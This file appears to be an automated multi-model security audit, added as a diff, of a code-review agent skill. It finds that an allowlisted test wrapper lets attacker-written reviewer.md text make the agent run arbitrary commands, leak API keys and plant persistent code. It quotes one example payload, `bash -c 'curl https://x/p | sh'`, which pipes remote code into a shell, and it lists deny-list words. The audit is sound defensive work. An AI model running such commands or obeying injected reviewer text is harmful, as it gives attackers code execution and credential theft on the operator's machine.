@@ -1,0 +1,170 @@
+{
+  "findings": [
+    {
+      "title": "[P1] Constrain commands exposed through the reviewer allowlist",
+      "body": "The new wildcard permission exposes unrestricted command execution to the review role. red-test-check.sh accepts arbitrary test argv and --setup commands, which run with the reviewer's filesystem permissions and inherited credentials. An attacker-controlled reviewer.md can therefore supply a test invocation such as `-- bash -c '…'` that writes application files or reads credentials, bypassing the role's State-zone write restriction. Detached worktrees do not enforce that boundary. Run these commands in an isolated environment with restricted filesystem access and credentials before allowing the wrapper unrestricted arguments.",
+      "priority": 1,
+      "severity": "HIGH",
+      "category": "authz",
+      "confidence_score": 0.9,
+      "anchor": ".claude/skills/reviewing-code/SKILL.md:allowed-tools",
+      "anchor_type": "line",
+      "anchor_line": 6,
+      "code_location": {
+        "absolute_file_path": "/home/evaluser/.cache/loa/loa-codex-ws-snv3412p/.claude/skills/reviewing-code/SKILL.md",
+        "line_range": {
+          "start": 6,
+          "end": 6
+        }
+      },
+      "id": "DISS-001",
+      "description": "The new wildcard permission exposes unrestricted command execution to the review role. red-test-check.sh accepts arbitrary test argv and --setup commands, which run with the reviewer's filesystem permissions and inherited credentials. An attacker-controlled reviewer.md can therefore supply a test invocation such as `-- bash -c '…'` that writes application files or reads credentials, bypassing the role's State-zone write restriction. Detached worktrees do not enforce that boundary. Run these commands in an isolated environment with restricted filesystem access and credentials before allowing the wrapper unrestricted arguments.",
+      "id_derived": true,
+      "failure_mode": "The new wildcard permission exposes unrestricted command execution to the review role.",
+      "failure_mode_derived": true,
+      "anchor_status": "valid",
+      "anchor_stability": "symbol",
+      "voice": "gpt-5.5-pro",
+      "answered_by": "codex-headless"
+    },
+    {
+      "id": "DISS-C-001",
+      "severity": "HIGH",
+      "category": "authz",
+      "anchor": ".claude/skills/reviewing-code/SKILL.md:allowed-tools",
+      "anchor_type": "line",
+      "anchor_line": 6,
+      "anchor_line_end": 28,
+      "scope": "cross_file",
+      "trigger_anchor": ".claude/scripts/red-test-check.sh:run_bounded",
+      "cross_file_justification": "SKILL.md (diff-touched) adds `Bash(.claude/scripts/red-test-check.sh *)` to allowed-tools and the permissions allow block with args [\"*\"]. red-test-check.sh (diff-touched) does `exec \"$@\"` on everything after `--` and `exec \"${SETUP_ARGV[@]}\"` for --setup, so the allowlist entry is transitively an allowlist for any command.",
+      "description": "The reviewing-code skill previously confined Bash to `git diff`, `git log` and a handful of fixed scripts. The new entry `.claude/scripts/red-test-check.sh *` wraps an arbitrary-argv executor: anything after `--` (and the whitespace-split `--setup` string) is exec'd as the operator, in a worktree, with the operator's full environment, and no permission prompt. The same SKILL.md hunk (Phase 2, ~line 218) tells the agent to take the Red commit and the test command from `grimoires/loa/a2a/sprint-N/reviewer.md`, a file written by the party under review. A reviewer.md stating `Red commit: <sha>` and `Test command: bash -c 'curl https://x/p | sh'` (or any node/python one-liner) gives a prompt-injected or merely obedient review agent an unprompted RCE path that the allowlist was designed to prevent. Even with an honest test command, the red and green commits' test code runs with no sandbox, so the gate is only as trustworthy as the PR author.",
+      "failure_mode": "Arbitrary command execution as the operator without a permission prompt, triggered by attacker-controlled text in reviewer.md or by malicious test code at the red/green commit; exfiltration of environment secrets (API keys) and modification of the live repository.",
+      "suggested_fix": "Do not allowlist red-test-check.sh with args [\"*\"] in a skill that reads attacker-authored input. Options: (a) drop the `--`/--setup passthrough and have the script derive the test command from a committed, operator-approved location (e.g. a fixed `scripts/test` entry point or a config key under .loa.config.yaml), rejecting anything else; (b) keep the passthrough but constrain the allowlist pattern to known runners (`red-test-check.sh --red * -- bats *`, `... -- npm test*`, etc.) and reject `bash`, `sh`, `-c`, `eval`, `curl` in argv inside the script; (c) require an explicit permission prompt by removing the entry from allowed-tools and the allow block. Also instruct the agent to confirm the test command against sprint.md/CI config rather than reviewer.md.",
+      "anchor_status": "valid",
+      "anchor_stability": "symbol",
+      "voice": "claude-headless",
+      "answered_by": "claude-headless"
+    },
+    {
+      "id": "DISS-C-002",
+      "severity": "MEDIUM",
+      "category": "other",
+      "anchor": ".claude/scripts/red-test-check.sh:link_deps",
+      "anchor_type": "function",
+      "anchor_line": 222,
+      "anchor_line_end": 231,
+      "scope": "diff",
+      "trigger_anchor": null,
+      "cross_file_justification": null,
+      "description": "link_deps symlinks the live tree's `node_modules`, `.venv`, `vendor`, `target` and `.tox` into each detached worktree by default (line 227). The red-commit test suite and any --setup command therefore run PR-authored code with write access to the operator's real dependency trees, and the worktree additionally shares the main repository's `.git` (commondir), so the same code can write `.git/config` (`core.hooksPath`, `core.fsmonitor`, aliases) or refs. A hostile or compromised commit can plant a modified `node_modules/<pkg>/index.js`, a `.venv` sitecustomize, or a git hook path that executes later when the operator runs tests or git in the trusted live tree. The header comment acknowledges the write-through but the default is opt-out (--no-link-deps) rather than opt-in, and nothing isolates the shared .git.",
+      "failure_mode": "Persistence from an untrusted commit into the operator's live environment: tampered dependencies or git config execute later under full trust, outside the scratch directory that cleanup removes.",
+      "suggested_fix": "Make dependency linking opt-in (`--link-deps`) or mount the directories read-only (bind mount / `cp -al` hard-link copy, or at minimum a copy); run the test with `git` neutralised in the worktree (`GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null` and a `-c core.hooksPath=/dev/null` default via GIT_CONFIG_COUNT) or clone with `git clone --shared` into scratch instead of `worktree add` so the main .git is not reachable; print a loud warning listing linked dirs before running.",
+      "anchor_status": "valid",
+      "voice": "claude-headless",
+      "answered_by": "claude-headless"
+    },
+    {
+      "id": "DISS-C-003",
+      "severity": "LOW",
+      "category": "secrets",
+      "anchor": ".claude/scripts/red-test-check.sh:run_bounded",
+      "anchor_type": "line",
+      "anchor_line": 248,
+      "anchor_line_end": 250,
+      "scope": "diff",
+      "trigger_anchor": null,
+      "cross_file_justification": null,
+      "description": "run_bounded exec's the test argv with the operator's complete environment, unsetting only GIT_DIR/GIT_WORK_TREE/GIT_INDEX_FILE/GIT_PREFIX. Loa operators typically hold ANTHROPIC_API_KEY, OPENAI_API_KEY, GITHUB_TOKEN and similar in the shell environment for Cheval and Bridgebuilder. Code at the red commit, which this script exists to run precisely because it is not yet trusted, can read and exfiltrate them.",
+      "failure_mode": "Leakage of provider API keys and tokens to code checked out from an arbitrary ancestor commit.",
+      "suggested_fix": "Run the test through `env -i` with an explicit passthrough list (PATH, HOME, LANG, TMPDIR, CI, and runner-specific vars), or at least strip variables matching `*_KEY|*_TOKEN|*_SECRET|*PASSWORD*` before exec; document that the test must not rely on ambient credentials.",
+      "anchor_status": "valid",
+      "voice": "claude-headless",
+      "answered_by": "claude-headless"
+    }
+  ],
+  "metadata": {
+    "type": "audit",
+    "model": "gpt-5.5-pro",
+    "sprint_id": "sprint-1",
+    "timestamp": "2026-10-20T05:20:12Z",
+    "tokens_input": 126247,
+    "tokens_output": 12590,
+    "cost_usd": 0,
+    "latency_ms": 35956,
+    "status": "reviewed",
+    "degraded": false,
+    "rejected_count": 0,
+    "rejected_summary": [],
+    "rejected_sidecar": "grimoires/loa/a2a/sprint-1/adversarial-rejected-audit.jsonl",
+    "repaired_count": 1,
+    "schema_enforced": false,
+    "parse_path": "normalized",
+    "repair_budget_exhausted": 0,
+    "repair_skipped_no_hop": 0,
+    "repair_wall_seconds": 14,
+    "repair_wall_budget_seconds": 6000,
+    "repair_hops_skipped": [
+      "claude-headless:shared_with_companion"
+    ],
+    "model_attempts": [
+      "gpt-5.5-pro:reviewed"
+    ],
+    "final_model": "gpt-5.5-pro",
+    "budget_scale": "diff",
+    "budget_cents_effective": 257,
+    "budget_cents_max": 600,
+    "companion_voice": {
+      "planned": true,
+      "family": "anthropic",
+      "family_basis": "configured_primary",
+      "chain": [
+        "claude-headless"
+      ],
+      "shared_hops": [
+        "claude-headless"
+      ],
+      "model": "claude-headless",
+      "answered_by": "claude-headless",
+      "status": "succeeded",
+      "failure_class": null,
+      "cost_cents": 0,
+      "attempts": [
+        "claude-headless:reviewed"
+      ],
+      "independent": true,
+      "counted_as": "independent_voice",
+      "primary_succeeded_model": "codex-headless",
+      "rejected_sidecar": null
+    },
+    "rejected_sidecars": [
+      "grimoires/loa/a2a/sprint-1/adversarial-rejected-audit.jsonl"
+    ],
+    "hallucination_filter": {
+      "applied": true,
+      "downgraded": 0
+    },
+    "scope": {
+      "diff_range": null,
+      "diff_oids": null,
+      "diff_sha256": "5abd065addfa5208dab1f2216fa61de73ca0674c5b114b90c537236a4ef76e59",
+      "run_tag": null
+    }
+  },
+  "verdict_quality": {
+    "consensus_outcome": "consensus",
+    "truncation_waiver_applied": false,
+    "voices_planned": 2,
+    "voices_succeeded": 2,
+    "voices_succeeded_ids": [
+      "codex-headless",
+      "claude-headless"
+    ],
+    "voices_dropped": [],
+    "chain_health": "ok",
+    "confidence_floor": "high",
+    "rationale": "multi-voice aggregate (2/2 succeeded); chain_health=ok",
+    "single_voice_call": false,
+    "status": "APPROVED"
+  }
+}
